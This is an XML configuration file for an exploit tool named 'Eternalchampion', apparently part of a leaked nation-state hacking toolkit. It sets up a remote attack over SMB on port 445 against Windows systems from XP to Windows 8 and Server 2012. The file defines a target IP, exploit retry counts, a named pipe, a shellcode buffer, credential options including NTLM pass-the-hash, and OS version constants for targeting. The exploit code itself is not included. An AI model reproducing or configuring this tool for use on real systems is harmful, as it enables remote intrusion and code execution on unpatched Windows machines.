<t:config xmlns:t="urn:trch" id="a2b184ef911a684c559fa2e9b9fa30ee868dfc70" configversion="2.0.0.0" name="Eternalchampion" version="2.0.0" schemaversion="2.1.0">
<t:inputparameters>
<t:parameter name="NetworkTimeout" description="Timeout for blocking network calls (in seconds).  Use -1 for no timeout." type="S16" format="Scalar" valid="true">
<t:default>60</t:default>
<t:value>60</t:value>
</t:parameter>
<t:parameter name="TargetIp" description="The actual (non-redirected) Target IP Address" type="IPv4" format="Scalar" valid="true">
<t:value>10.0.0.121</t:value>
</t:parameter>
<t:parameter name="TargetPort" description="The actual (non-redirected) Target TCP port" type="TcpPort" format="Scalar" valid="true">
<t:default>445</t:default>
<t:value>445</t:value>
</t:parameter>
<t:parameter name="RedirectedTargetIp" description="The physical (redirected) target IP address" type="IPv4" format="Scalar" hidden="true" required="false"></t:parameter>
<t:parameter name="RedirectedTargetPort" description="The physical (redirected) target TCP port" type="TcpPort" format="Scalar" hidden="true" required="false"></t:parameter>
<t:parameter name="DaveProxyPort" description="DAVE Core/Proxy Hookup connection port" type="TcpPort" format="Scalar" hidden="true" valid="true">
<t:default>0</t:default>
<t:value>0</t:value>
</t:parameter>
<t:parameter name="MaxExploitAttempts" description="Number of tries to exploit. Default 42" type="U32" format="Scalar" hidden="true" valid="true">
<t:default>42</t:default>
<t:value>42</t:value>
</t:parameter>
<t:parameter name="PipeName" description="The named pipe to use (Win7+ only, need Pipe or Share)" type="String" format="Scalar" valid="true">
<t:default></t:default>
<t:value>pipename</t:value>
</t:parameter>
<t:parameter name="ShareName" description="The name of the share to use in Unicode (Win7+ only, need Pipe or Share)" type="Buffer" format="Scalar" valid="true">
<t:default></t:default>
<t:value></t:value>
</t:parameter>
<t:parameter name="ShellcodeBuffer" description="DOPU Shellcode buffer" type="Buffer" format="Scalar" valid="true">
<t:value>00</t:value>
</t:parameter>
<t:paramchoice name="Credentials" description="Type of credentials to use">
<t:default>Anonymous</t:default>
<t:value>Anonymous</t:value>
<t:paramgroup name="Anonymous" description="Anonymous (NULL session)"></t:paramgroup>
<t:paramgroup name="Guest" description="Guest account"></t:paramgroup>
<t:paramgroup name="Blank" description="User account with no password set">
<t:parameter name="Username" description="Username entered as hex bytes (in unicode)" type="Buffer" format="Scalar"></t:parameter>
</t:paramgroup>
<t:paramgroup name="Password" description="User name and password">
<t:parameter name="Username" description="Username entered as hex bytes (in unicode)" type="Buffer" format="Scalar"></t:parameter>
<t:parameter name="Password" description="Password entered as hex bytes (in unicode)" type="Buffer" format="Scalar"></t:parameter>
</t:paramgroup>
<t:paramgroup name="NTLM" description="User name and NTLM hash">
<t:parameter name="Username" description="Username entered as hex bytes (in unicode)" type="Buffer" format="Scalar"></t:parameter>
<t:parameter name="NtlmHash" description="NTLM password hash (in hex)" type="Buffer" format="Scalar"></t:parameter>
</t:paramgroup>
</t:paramchoice>
<t:paramchoice name="Protocol" description="SMB (default port 445) or NBT (default port 139)">
<t:default>SMB</t:default>
<t:value>SMB</t:value>
<t:paramgroup name="SMB" description="SMB protocol"></t:paramgroup>
<t:paramgroup name="NBT" description="Netbios protocol"></t:paramgroup>
</t:paramchoice>
<t:paramchoice name="Target" description="Operating System, Service Pack, of target OS">
<t:value>SERVER_2008_SP2</t:value>
<t:paramgroup name="XP_SP0SP1_X86" description="Windows XP Sp0 and Sp1, 32-bit"></t:paramgroup>
<t:paramgroup name="XP_SP2SP3_X86" description="Windows XP Sp2 and Sp3, 32-bit"></t:paramgroup>
<t:paramgroup name="XP_SP1_X64" description="Windows XP Sp1, 64-bit"></t:paramgroup>
<t:paramgroup name="XP_SP2_X64" description="Windows XP Sp2, 64-bit"></t:paramgroup>
<t:paramgroup name="SERVER_2003_SP0" description="Windows Sever 2003 Sp0, 32-bit"></t:paramgroup>
<t:paramgroup name="SERVER_2003_SP1" description="Windows Sever 2003 Sp1, 32-bit/64-bit"></t:paramgroup>
<t:paramgroup name="SERVER_2003_SP2" description="Windows Sever 2003 Sp2, 32-bit/64-bit"></t:paramgroup>
<t:paramgroup name="VISTA_SP0" description="Windows Vista Sp0, 32-bit/64-bit"></t:paramgroup>
<t:paramgroup name="VISTA_SP1" description="Windows Vista Sp1, 32-bit/64-bit"></t:paramgroup>
<t:paramgroup name="VISTA_SP2" description="Windows Vista Sp2, 32-bit/64-bit"></t:paramgroup>
<t:paramgroup name="SERVER_2008_SP0" description="Windows Server 2008 Sp0, 32-bit/64-bit"></t:paramgroup>
<t:paramgroup name="SERVER_2008_SP1" description="Windows Server 2008 Sp1, 32-bit/64-bit"></t:paramgroup>
<t:paramgroup name="SERVER_2008_SP2" description="Windows Server 2008 Sp2, 32-bit/64-bit"></t:paramgroup>
<t:paramgroup name="WIN7_SP0" description="Windows 7 Sp0, 32-bit/64-bit"></t:paramgroup>
<t:paramgroup name="WIN7_SP1" description="Windows 7 Sp1, 32-bit/64-bit"></t:paramgroup>
<t:paramgroup name="SERVER_2008R2_SP0" description="Windows Server 2008 R2 Sp0, 32-bit/64-bit"></t:paramgroup>
<t:paramgroup name="SERVER_2008R2_SP1" description="Windows Server 2008 R2 Sp1, 32-bit/64-bit"></t:paramgroup>
<t:paramgroup name="WIN8_SP0" description="Windows 8 Sp0, 32-bit/64-bit"></t:paramgroup>
</t:paramchoice>
<t:paramchoice name="TargetOsArchitecture" description="The architecture of the target operating system">
<t:default>Unknown</t:default>
<t:value>Unknown</t:value>
<t:paramgroup name="Unknown" description="The architecture is not known (exploit will figure it out)"></t:paramgroup>
<t:paramgroup name="x86" description="The target is 32-bit"></t:paramgroup>
<t:paramgroup name="x64" description="The target is 64-bit"></t:paramgroup>
</t:paramchoice>
</t:inputparameters>
<t:constants>
<t:parameter name="XP_SP0SP1_X86" description="" type="U32" format="Scalar" valid="true">
<t:value>83951616</t:value>
</t:parameter>
<t:parameter name="XP_SP2SP3_X86" description="" type="U32" format="Scalar" valid="true">
<t:value>83952128</t:value>
</t:parameter>
<t:parameter name="XP_SP1_X64" description="" type="U32" format="Scalar" valid="true">
<t:value>84017409</t:value>
</t:parameter>
<t:parameter name="XP_SP2_X64" description="" type="U32" format="Scalar" valid="true">
<t:value>84017665</t:value>
</t:parameter>
<t:parameter name="SERVER_2003_SP0" description="" type="U32" format="Scalar" valid="true">
<t:value>2231500802</t:value>
</t:parameter>
<t:parameter name="SERVER_2003_SP1" description="" type="U32" format="Scalar" valid="true">
<t:value>2231501058</t:value>
</t:parameter>
<t:parameter name="SERVER_2003_SP2" description="" type="U32" format="Scalar" valid="true">
<t:value>2231501314</t:value>
</t:parameter>
<t:parameter name="VISTA_SP0" description="" type="U32" format="Scalar" valid="true">
<t:value>100663298</t:value>
</t:parameter>
<t:parameter name="VISTA_SP1" description="" type="U32" format="Scalar" valid="true">
<t:value>100663554</t:value>
</t:parameter>
<t:parameter name="VISTA_SP2" description="" type="U32" format="Scalar" valid="true">
<t:value>100663810</t:value>
</t:parameter>
<t:parameter name="SERVER_2008_SP0" description="" type="U32" format="Scalar" valid="true">
<t:value>2248146946</t:value>
</t:parameter>
<t:parameter name="SERVER_2008_SP1" description="" type="U32" format="Scalar" valid="true">
<t:value>2248147202</t:value>
</t:parameter>
<t:parameter name="SERVER_2008_SP2" description="" type="U32" format="Scalar" valid="true">
<t:value>2248147458</t:value>
</t:parameter>
<t:parameter name="WIN7_SP0" description="" type="U32" format="Scalar" valid="true">
<t:value>100728834</t:value>
</t:parameter>
<t:parameter name="WIN7_SP1" description="" type="U32" format="Scalar" valid="true">
<t:value>100729090</t:value>
</t:parameter>
<t:parameter name="SERVER_2008R2_SP0" description="" type="U32" format="Scalar" valid="true">
<t:value>2248212482</t:value>
</t:parameter>
<t:parameter name="SERVER_2008R2_SP1" description="" type="U32" format="Scalar" valid="true">
<t:value>2248212738</t:value>
</t:parameter>
<t:parameter name="WIN8_SP0" description="" type="U32" format="Scalar" valid="true">
<t:value>100794370</t:value>
</t:parameter>
<t:parameter name="SERVER_2K12_SP0" description="" type="U32" format="Scalar" valid="true">
<t:value>2248278018</t:value>
</t:parameter>
<t:parameter name="x86" description="32-bit Architecture" type="U8" format="Scalar" valid="true">
<t:value>0</t:value>
</t:parameter>
<t:parameter name="x64" description="64-bit Architecture" type="U8" format="Scalar" valid="true">
<t:value>1</t:value>
</t:parameter>
<t:parameter name="Unknown" description="Unknown Architecture" type="U8" format="Scalar" valid="true">
<t:value>2</t:value>
</t:parameter>
<t:parameter name="Anonymous" description="" type="U8" format="Scalar" valid="true">
<t:value>0</t:value>
</t:parameter>
<t:parameter name="Guest" description="" type="U8" format="Scalar" valid="true">
<t:value>1</t:value>
</t:parameter>
<t:parameter name="Blank" description="" type="U8" format="Scalar" valid="true">
<t:value>2</t:value>
</t:parameter>
<t:parameter name="Password" description="" type="U8" format="Scalar" valid="true">
<t:value>3</t:value>
</t:parameter>
<t:parameter name="NTLM" description="" type="U8" format="Scalar" valid="true">
<t:value>4</t:value>
</t:parameter>
</t:constants>
</t:config>
